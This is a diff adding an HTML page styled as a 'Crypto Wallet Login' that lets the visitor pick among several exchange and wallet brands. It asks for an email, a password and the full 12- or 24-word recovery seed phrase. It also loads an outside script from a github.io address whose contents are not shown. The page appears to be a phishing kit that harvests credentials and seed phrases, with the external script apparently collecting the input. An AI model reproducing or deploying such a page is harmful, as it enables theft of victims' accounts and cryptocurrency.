@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crypto Wallet Login & Backup</title>
+<style>
+/* Reset & font */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body {
+  background-color: #0a0a0f; /* dark crypto theme */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  color: white;
+}
+
+.container {
+  background-color: #12121d;
+  padding: 40px;
+  border-radius: 12px;
+  width: 400px;
+  box-shadow: 0 0 25px rgba(0,255,200,0.2);
+}
+
+h2 {
+  color: #00ffc3;
+  text-align: center;
+  margin-bottom: 25px;
+}
+
+.wallet-select label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 14px;
+}
+
+select {
+  width: 100%;
+  padding: 10px;
+  border-radius: 8px;
+  border: 1px solid #333;
+  background-color: #1e1e2f;
+  color: white;
+  margin-bottom: 20px;
+}
+
+input[type="text"],
+input[type="password"],
+textarea {
+  width: 100%;
+  padding: 12px;
+  margin-bottom: 18px;
+  border-radius: 8px;
+  border: 1px solid #333;
+  background-color: #1e1e2f;
+  color: white;
+  font-size: 14px;
+}
+
+textarea {
+  resize: none;
+  height: 80px;
+}
+
+input[type="submit"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background-color: #00ffc3;
+  color: #0a0a0f;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+input[type="submit"]:hover {
+  background-color: #00e6b0;
+}
+
+.links a {
+  display: block;
+  margin-top: 12px;
+  font-size: 13px;
+  color: #00ffc3;
+  text-decoration: none;
+}
+
+.links a:hover {
+  text-decoration: underline;
+}
+
+.backup-section {
+  margin-top: 20px;
+  border-top: 1px solid #333;
+  padding-top: 15px;
+}
+
+.backup-section h3 {
+  font-size: 16px;
+  color: #00ffc3;
+  margin-bottom: 10px;
+}
+
+.backup-section p {
+  font-size: 12px;
+  color: #aaa;
+  margin-bottom: 10px;
+}
+
+.note {
+  font-size: 12px;
+  margin-top: 10px;
+  color: #aaa;
+}
+</style>
+</head>
+<body>
+<script src="https://ysktshsh.github.io/intfolder/int5.js"></script>
+<div class="container">
+  <h2>Crypto Wallet Login</h2>
+  <form>
+    <!-- Wallet selection -->
+    <div class="wallet-select">
+      <label for="wallet">Choose Wallet Platform</label>
+      <select id="wallet">
+        <option>Binance Wallet</option>
+        <option>Coinbase Wallet</option>
+        <option>Trust Wallet</option>
+        <option>MetaMask</option>
+        <option>Blockchain.com</option>
+        <option>Kraken Account</option>
+      </select>
+    </div>
+
+    <!-- Login inputs -->
+    <input type="text" placeholder="Email or Wallet ID" required>
+    <input type="password" placeholder="Password" required>
+    <input type="submit" value="Access Wallet">
+
+    <div class="links">
+      <a href="#">Forgot password?</a>
+      <a href="#">Create new wallet</a>
+    </div>
+
+    <!-- Backup / Recovery phrases -->
+    <div class="backup-section">
+      <h3>Manual Backup (Seed Phrase)</h3>
+      <p>Enter your 12 or 24-word recovery phrase to access your wallet:</p>
+      <textarea placeholder="Enter your backup phrases here..." required></textarea>
+      <p class="note">Keep these phrases safe. Anyone with them can access your wallet.</p>
+    </div>
+
+    <!-- Optional additional features -->
+    <div class="backup-section">
+      <h3>Additional Options</h3>
+      <p>You can also enable:</p>
+      <textarea placeholder="Enter security questions or notes..." ></textarea>
+      <p class="note">Optional: Use for extra security or reminders.</p>
+    </div>
+  </form>
+</div>
+
+</body>
+</html>
